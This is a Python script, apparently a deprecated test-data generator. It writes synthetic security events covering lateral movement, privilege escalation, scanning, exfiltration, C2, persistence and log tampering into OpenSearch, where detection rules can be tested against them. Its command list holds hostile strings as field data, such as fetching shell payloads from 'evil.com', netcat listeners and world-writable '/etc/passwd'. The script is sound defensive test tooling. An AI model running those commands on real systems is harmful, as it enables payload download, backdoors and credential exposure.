#!/usr/bin/env python3
"""
生成大量测试 Events（至少100个）

功能：
1. 生成至少100个包含威胁特征的events
2. 包含多种攻击场景：
   - 横向移动（Lateral Movement）
   - 权限提升（Privilege Escalation）
   - 端口扫描（Port Scanning）
   - 数据泄露（Data Exfiltration）
   - 持久化（Persistence）
   - 命令与控制（C2）
   - 防御规避（Defense Evasion）
3. 写入到 ecs-events-* 索引

使用方法:
    uv run python generate_test_events.py [--count 100]
"""

import sys
import uuid
import random
from pathlib import Path
from datetime import datetime, timedelta, timezone

backend_dir = Path(__file__).parent.parent.parent.parent.parent
sys.path.insert(0, str(backend_dir))

from app.services.opensearch.storage import store_events
from app.services.opensearch.index import initialize_indices
from app.core.time import to_rfc3339


# 主机配置
HOSTS = [
    {"id": "host-100", "name": "host-100", "ip": "192.168.1.100"},
    {"id": "host-101", "name": "host-101", "ip": "192.168.1.101"},
    {"id": "host-102", "name": "host-102", "ip": "192.168.1.102"},
    {"id": "host-103", "name": "host-103", "ip": "192.168.1.103"},
    {"id": "host-104", "name": "host-104", "ip": "192.168.1.104"},
]

# 用户配置
USERS = ["admin", "user1", "user2", "root", "service"]

# 可疑进程
SUSPICIOUS_PROCESSES = [
    "nc", "netcat", "nmap", "masscan", "metasploit", "mimikatz",
    "powershell", "cmd.exe", "bash", "sh", "python", "perl"
]

# 可疑命令
SUSPICIOUS_COMMANDS = [
    "nc -l -p 4444", "nmap -sS 192.168.1.0/24", "wget http://evil.com/shell.sh",
    "curl http://evil.com/payload", "python -c 'import socket'",
    "chmod +x /tmp/backdoor", "chmod 777 /etc/passwd",
    "systemctl enable backdoor", "crontab -e", "at now + 1 minute"
]

# 敏感文件路径
SENSITIVE_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/ssh/sshd_config",
    "/root/.ssh/id_rsa", "/home/*/.ssh/authorized_keys", "/etc/crontab"
]


def create_base_event(
    event_id: str,
    timestamp: datetime,
    host: dict,
    user: str = None,
    event_category: list = None,
    event_type: list = None,
    event_action: str = None,
    dataset: str = None,
    message: str = None
) -> dict:
    """创建基础event结构"""
    timestamp_str = to_rfc3339(timestamp)
    
    # 根据category确定dataset
    if not dataset:
        if event_category and "process" in event_category:
            dataset = "hostlog.process"
        elif event_category and "network" in event_category:
            dataset = "hostlog.network"
        elif event_category and "file" in event_category:
            dataset = "hostlog.file"
        elif event_category and "authentication" in event_category:
            dataset = "hostlog.auth"
        else:
            dataset = "hostlog.process"  # 默认
    
    event = {
        "ecs": {"version": "9.2.0"},
        "@timestamp": timestamp_str,
        "message": message or f"Event {event_id}",
        "event": {
            "id": event_id,
            "kind": "event",
            "category": event_category or ["process"],
            "type": event_type or ["start"],
            "action": event_action or "process_start",
            "dataset": dataset,
            "created": timestamp_str,
            "ingested": timestamp_str,
            "original": message or f"Event {event_id}"
        },
        "host": {
            "id": host["id"],
            "name": host["name"],
            "ip": [host["ip"]]
        }
    }
    
    if user:
        event["user"] = {
            "id": f"user-{user}",
            "name": user
        }
    
    return event


def create_process_event(
    host: dict,
    user: str,
    process_name: str,
    command_line: str,
    timestamp: datetime,
    parent_name: str = None,
    pid: int = None
) -> dict:
    """创建进程事件"""
    event_id = f"event-proc-{uuid.uuid4().hex[:8]}"
    message = f"Process started: {process_name} - {command_line}"
    event = create_base_event(
        event_id, timestamp, host, user,
        event_category=["process"],
        event_type=["start"],
        event_action="process_start",
        dataset="hostlog.process",
        message=message
    )
    
    pid_val = pid or random.randint(1000, 9999)
    event["process"] = {
        "entity_id": f"proc-{uuid.uuid4().hex[:8]}",
        "pid": pid_val,
        "name": process_name,
        "command_line": command_line,
        "executable": f"/usr/bin/{process_name}" if not process_name.endswith('.exe') else f"C:\\Windows\\System32\\{process_name}"
    }
    
    if parent_name:
        event["process"]["parent"] = {
            "pid": random.randint(100, 999),
            "name": parent_name
        }
    
    return event


def create_network_event(
    host: dict,
    source_ip: str,
    dest_ip: str,
    dest_port: int,
    timestamp: datetime,
    direction: str = "outbound",
    protocol: str = "tcp"
) -> dict:
    """创建网络事件"""
    event_id = f"event-net-{uuid.uuid4().hex[:8]}"
    message = f"Network connection: {source_ip}:* -> {dest_ip}:{dest_port} ({protocol})"
    event = create_base_event(
        event_id, timestamp, host,
        event_category=["network"],
        event_type=["connection"],
        event_action="network_connection",
        dataset="hostlog.network",
        message=message
    )
    
    event["source"] = {"ip": source_ip}
    event["destination"] = {
        "ip": dest_ip,
        "port": dest_port
    }
    event["network"] = {
        "transport": protocol,
        "direction": direction
    }
    
    return event


def create_file_event(
    host: dict,
    user: str,
    file_path: str,
    action: str,
    timestamp: datetime
) -> dict:
    """创建文件事件"""
    event_id = f"event-file-{uuid.uuid4().hex[:8]}"
    message = f"File {action}: {file_path}"
    event = create_base_event(
        event_id, timestamp, host, user,
        event_category=["file"],
        event_type=["access"],
        event_action=f"file_{action}",
        dataset="hostlog.file",
        message=message
    )
    
    event["file"] = {
        "path": file_path
    }
    
    return event


def create_dns_event(
    host: dict,
    query_name: str,
    timestamp: datetime
) -> dict:
    """创建DNS事件"""
    event_id = f"event-dns-{uuid.uuid4().hex[:8]}"
    message = f"DNS query: {query_name}"
    # DNS events应该使用dns相关的dataset，但如果没有，使用network也可以
    # 关键是要有dns字段
    event = create_base_event(
        event_id, timestamp, host,
        event_category=["network"],
        event_type=["info"],
        event_action="dns_query",
        dataset="hostlog.dns",  # 尝试使用dns dataset
        message=message
    )
    
    event["dns"] = {
        "question": {
            "name": query_name,
            "type": "A"
        }
    }
    
    return event


def create_authentication_event(
    host: dict,
    user: str,
    success: bool,
    timestamp: datetime,
    source_ip: str = None
) -> dict:
    """创建认证事件"""
    event_id = f"event-auth-{uuid.uuid4().hex[:8]}"
    outcome = "success" if success else "failure"
    message = f"User login {outcome}: {user} from {source_ip or 'local'}"
    event = create_base_event(
        event_id, timestamp, host, user,
        event_category=["authentication"],
        event_type=["start"],
        event_action="user_login",
        dataset="hostlog.auth",
        message=message
    )
    
    event["event"]["outcome"] = outcome
    
    if source_ip:
        event["source"] = {"ip": source_ip}
    
    return event


def generate_lateral_movement_events(base_time: datetime, count: int = 50) -> list:
    """
    生成横向移动事件（大幅增加数量）
    
    攻击链：
    1. 主机A上的提权行为（process event）
    2. 从A到B的网络连接（network event）
    3. 主机B上的认证（authentication event）
    4. 主机B上的可疑进程执行（process event，子进程）
    """
    events = []
    
    for i in range(count):
        # 主机A的提权行为
        host_a = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp_a = base_time + timedelta(seconds=i * 5)
        
        # 多个提权尝试（增加process events）
        for j in range(random.randint(2, 4)):
            event1 = create_process_event(
                host_a, user, "sudo", f"sudo su - {random.choice(USERS)}",
                timestamp_a + timedelta(seconds=j), parent_name="bash"
            )
            events.append(event1)
        
        # 从A到B的网络连接（增加network events）
        host_b = random.choice([h for h in HOSTS if h["id"] != host_a["id"]])
        timestamp_b = timestamp_a + timedelta(seconds=3)
        
        # 多个网络连接（SSH, RDP, SMB等）
        ports = [22, 3389, 445, 5985, 5986]  # SSH, RDP, SMB, WinRM
        for port in random.sample(ports, random.randint(2, 3)):
            event2 = create_network_event(
                host_a, host_a["ip"], host_b["ip"], port,
                timestamp_b + timedelta(seconds=random.randint(0, 2)),
                direction="outbound"
            )
            events.append(event2)
        
        # 主机B上的认证
        timestamp_c = timestamp_b + timedelta(seconds=2)
        event3 = create_authentication_event(
            host_b, user, True, timestamp_c, source_ip=host_a["ip"]
        )
        events.append(event3)
        
        # 主机B上的可疑进程（多个子进程，增加process events）
        timestamp_d = timestamp_c + timedelta(seconds=1)
        # 创建多个子进程，模拟攻击者在目标主机上的活动
        for k in range(random.randint(3, 6)):
            # 第一个进程的父进程是sshd（表示远程登录后执行）
            parent_name = "sshd" if k == 0 else random.choice(SUSPICIOUS_PROCESSES)
            event4 = create_process_event(
                host_b, user, random.choice(SUSPICIOUS_PROCESSES),
                random.choice(SUSPICIOUS_COMMANDS),
                timestamp_d + timedelta(seconds=k),
                parent_name=parent_name,
                pid=random.randint(5000, 9999)
            )
            events.append(event4)
    
    return events


def generate_privilege_escalation_events(base_time: datetime, count: int = 30) -> list:
    """生成权限提升事件（增加process和file events）"""
    events = []
    
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 5)
        
        # 多个提权尝试（增加process events）
        for j in range(random.randint(2, 4)):
            event1 = create_process_event(
                host, user, "sudo", f"sudo chmod 777 {random.choice(SENSITIVE_FILES)}",
                timestamp + timedelta(seconds=j), parent_name="bash"
            )
            events.append(event1)
        
        # 访问敏感文件（增加file events）
        timestamp2 = timestamp + timedelta(seconds=3)
        for file_path in random.sample(SENSITIVE_FILES, random.randint(2, 3)):
            event2 = create_file_event(
                host, user, file_path,
                "read", timestamp2 + timedelta(seconds=random.randint(0, 1))
            )
            events.append(event2)
        
        # 修改敏感文件
        timestamp3 = timestamp2 + timedelta(seconds=2)
        event3 = create_file_event(
            host, user, "/etc/passwd",
            "modify", timestamp3
        )
        events.append(event3)
        
        # 创建新的特权进程（子进程）
        timestamp4 = timestamp3 + timedelta(seconds=1)
        for k in range(random.randint(2, 3)):
            event4 = create_process_event(
                host, user, random.choice(["su", "sudo", "runuser"]),
                f"{random.choice(['su', 'sudo', 'runuser'])} - root -c '{random.choice(SUSPICIOUS_COMMANDS)}'",
                timestamp4 + timedelta(seconds=k),
                parent_name="bash"
            )
            events.append(event4)
    
    return events


def generate_port_scanning_events(base_time: datetime, count: int = 30) -> list:
    """生成端口扫描事件（大幅增加network events数量）"""
    events = []
    
    attacker_host = random.choice(HOSTS)
    
    for i in range(count):
        # 扫描不同端口（增加扫描的端口数量）
        target_host = random.choice([h for h in HOSTS if h["id"] != attacker_host["id"]])
        ports = [22, 80, 443, 445, 3389, 3306, 5432, 8080, 21, 25, 53, 110, 143, 993, 995, 23, 135, 139, 1433, 3306]
        
        # 每次扫描更多端口（模拟真实的端口扫描行为）
        for port in random.sample(ports, random.randint(8, 12)):
            timestamp = base_time + timedelta(seconds=i * 2 + random.randint(0, 1))
            event = create_network_event(
                attacker_host, attacker_host["ip"], target_host["ip"],
                port, timestamp, direction="outbound"
            )
            events.append(event)
    
    return events


def generate_data_exfiltration_events(base_time: datetime, count: int = 25) -> list:
    """生成数据泄露事件（增加file和network events）"""
    events = []
    
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 8)
        
        # 读取多个敏感文件（增加file events）
        for file_path in random.sample(SENSITIVE_FILES, random.randint(2, 4)):
            event1 = create_file_event(
                host, user, file_path,
                "read", timestamp + timedelta(seconds=random.randint(0, 2))
            )
            events.append(event1)
        
        # 多个网络传输连接（增加network events）
        timestamp2 = timestamp + timedelta(seconds=3)
        for j in range(random.randint(2, 4)):
            external_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            ports = [443, 80, 8080, 8443]  # HTTPS, HTTP等
            event2 = create_network_event(
                host, host["ip"], external_ip, random.choice(ports),
                timestamp2 + timedelta(seconds=j), direction="outbound"
            )
            events.append(event2)
    
    return events


def generate_persistence_events(base_time: datetime, count: int = 10) -> list:
    """生成持久化事件"""
    events = []
    
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 12)
        
        # 创建crontab
        event1 = create_process_event(
            host, user, "crontab", "crontab -e",
            timestamp, parent_name="bash"
        )
        events.append(event1)
        
        # 创建systemd服务
        timestamp2 = timestamp + timedelta(seconds=2)
        event2 = create_file_event(
            host, user, "/etc/systemd/system/backdoor.service",
            "create", timestamp2
        )
        events.append(event2)
        
        # 启动服务
        timestamp3 = timestamp2 + timedelta(seconds=1)
        event3 = create_process_event(
            host, user, "systemctl", "systemctl enable backdoor.service",
            timestamp3, parent_name="bash"
        )
        events.append(event3)
    
    return events


def generate_c2_events(base_time: datetime, count: int = 15) -> list:
    """生成命令与控制事件（增加DNS events数量）"""
    events = []
    
    for i in range(count):
        host = random.choice(HOSTS)
        timestamp = base_time + timedelta(seconds=i * 10)
        
        # DNS查询可疑域名（增加DNS events）
        suspicious_domains = [
            "evil.com", "malware.net", "c2.example.com",
            "command-control.org", "backdoor.io", "suspicious-domain.com",
            "malicious-site.net", "phishing-domain.org", "trojan-host.com"
        ]
        # 每个C2事件生成2-3个DNS查询
        for j in range(random.randint(2, 3)):
            event_dns = create_dns_event(
                host, random.choice(suspicious_domains), 
                timestamp + timedelta(seconds=j)
            )
            events.append(event_dns)
        
        # 连接到C2服务器
        timestamp2 = timestamp + timedelta(seconds=3)
        c2_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        event2 = create_network_event(
            host, host["ip"], c2_ip, 443,
            timestamp2, direction="outbound"
        )
        events.append(event2)
    
    return events


def generate_defense_evasion_events(base_time: datetime, count: int = 10) -> list:
    """生成防御规避事件"""
    events = []
    
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 8)
        
        # 清除日志
        event1 = create_file_event(
            host, user, "/var/log/auth.log",
            "delete", timestamp
        )
        events.append(event1)
        
        # 隐藏进程
        timestamp2 = timestamp + timedelta(seconds=1)
        event2 = create_process_event(
            host, user, "kill", "kill -9 $(pgrep log)",
            timestamp2, parent_name="bash"
        )
        events.append(event2)
    
    return events


def generate_misc_threat_events(base_time: datetime, count: int = 20) -> list:
    """生成其他威胁事件"""
    events = []
    
    for i in range(count):
        host = random.choice(HOSTS)
        user = random.choice(USERS)
        timestamp = base_time + timedelta(seconds=i * 5)
        
        # 随机生成各种可疑事件
        event_type = random.choice([
            "process", "network", "file", "dns"
        ])
        
        if event_type == "process":
            event = create_process_event(
                host, user, random.choice(SUSPICIOUS_PROCESSES),
                random.choice(SUSPICIOUS_COMMANDS),
                timestamp, parent_name=random.choice(["bash", "sh", "python"])
            )
        elif event_type == "network":
            target_host = random.choice([h for h in HOSTS if h["id"] != host["id"]])
            event = create_network_event(
                host, host["ip"], target_host["ip"],
                random.randint(1, 65535), timestamp
            )
        elif event_type == "file":
            event = create_file_event(
                host, user, random.choice(SENSITIVE_FILES),
                random.choice(["read", "modify", "create"]),
                timestamp
            )
        else:  # dns
            event = create_dns_event(
                host, f"suspicious-{random.randint(1, 1000)}.com", timestamp
            )
        
        events.append(event)
    
    return events


def main():
    """主函数"""
    import argparse
    
    parser = argparse.ArgumentParser(description="生成测试Events")
    parser.add_argument(
        "--count",
        type=int,
        default=100,
        help="要生成的events数量（默认: 100）"
    )
    parser.add_argument(
        "--base-time",
        type=str,
        default=None,
        help="基准时间（ISO格式，默认: 当前时间）"
    )
    
    args = parser.parse_args()
    
    print("=" * 80)
    print("生成测试 Events")
    print("=" * 80)
    
    # 初始化索引
    print("\n[1] 初始化索引...")
    initialize_indices()
    
    # 设置基准时间
    if args.base_time:
        base_time = datetime.fromisoformat(args.base_time.replace('Z', '+00:00'))
    else:
        base_time = datetime.now(timezone.utc) - timedelta(hours=1)
    
    print(f"\n[2] 基准时间: {base_time.isoformat()}")
    print(f"[3] 目标数量: {args.count} 个events")
    
    # 生成各种类型的events
    print("\n[4] 生成events...")
    all_events = []
    
    # 计算每种类型的数量（确保总数至少达到目标）
    # 大幅增加横向移动、端口扫描、权限提升等类型的events
    total_target = max(args.count, 200)
    per_type = max(25, total_target // 7)  # 7种类型，每种至少25个
    
    # 横向移动和端口扫描需要更多events
    lateral_count = per_type * 2  # 横向移动：2倍
    port_scan_count = per_type * 2  # 端口扫描：2倍
    privilege_count = per_type * 2  # 权限提升：2倍
    
    print(f"  横向移动: {lateral_count} 个（包含大量process和network events）")
    all_events.extend(generate_lateral_movement_events(base_time, lateral_count))
    
    print(f"  权限提升: {privilege_count} 个（包含大量process和file events）")
    all_events.extend(generate_privilege_escalation_events(base_time, privilege_count))
    
    print(f"  端口扫描: {port_scan_count} 个（包含大量network events）")
    all_events.extend(generate_port_scanning_events(base_time, port_scan_count))
    
    print(f"  数据泄露: {per_type} 个（包含file和network events）")
    all_events.extend(generate_data_exfiltration_events(base_time, per_type))
    
    print(f"  持久化: {per_type} 个")
    all_events.extend(generate_persistence_events(base_time, per_type))
    
    print(f"  命令与控制: {per_type} 个")
    all_events.extend(generate_c2_events(base_time, per_type))
    
    print(f"  防御规避: {per_type} 个")
    all_events.extend(generate_defense_evasion_events(base_time, per_type))
    
    print(f"  其他威胁: {per_type} 个")
    all_events.extend(generate_misc_threat_events(base_time, per_type))
    
    print(f"\n[5] 总共生成了 {len(all_events)} 个events")
    
    # 写入OpenSearch（使用优化的批量写入）
    print("\n[6] 写入OpenSearch（优化的批量写入，避免OOM）...")
    
    # 如果events数量超过500，使用分批写入
    if len(all_events) > 500:
        print(f"  Events数量较多（{len(all_events)}），使用分批写入...")
        from app.services.opensearch.scripts.optimize_bulk_write import store_events_optimized
        result = store_events_optimized(all_events, batch_size=300, refresh_after=True)
    else:
        result = store_events(all_events)
    
    print("\n" + "=" * 80)
    print("完成")
    print("=" * 80)
    print(f"  总数: {result.get('total', 0)}")
    print(f"  成功: {result.get('success', 0)}")
    print(f"  失败: {result.get('failed', 0)}")
    print(f"  重复: {result.get('duplicated', 0)}")
    print(f"  丢弃: {result.get('dropped', 0)}")
    
    if result.get('success', 0) >= args.count:
        print(f"\n[OK] 成功生成至少 {args.count} 个events")
    else:
        print(f"\n[WARNING] 实际生成 {result.get('success', 0)} 个events（目标: {args.count}）")
    
    print("\n[INFO] 现在可以运行 Security Analytics 检测来生成findings")
    print("[INFO] 然后运行 correlation analysis 来查看correlations")


if __name__ == "__main__":
    import warnings
    warnings.warn(
        "generate_test_events.py已弃用，请使用 consolidated_data_generator.py",
        DeprecationWarning,
        stacklevel=2
    )
    print("\n[WARNING] 此脚本已弃用")
    print("[INFO] 请使用: uv run python consolidated_data_generator.py")
    print("[INFO] 或者直接运行此脚本（功能已保留）\n")
    main()
